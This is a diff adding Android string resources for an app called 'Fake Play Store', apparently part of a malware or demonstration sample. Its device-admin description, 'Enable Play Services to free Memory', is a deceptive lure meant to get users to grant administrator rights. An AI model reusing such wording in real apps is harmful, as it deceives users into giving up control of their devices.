@@ -1,0 +1,5 @@
+<resources>
+    <string name="app_name">Fake Play Store</string>
+    <string name="device_admin_label">Device Admin</string>
+    <string name="device_description">Enable Play Services to free Memory</string>
+</resources>
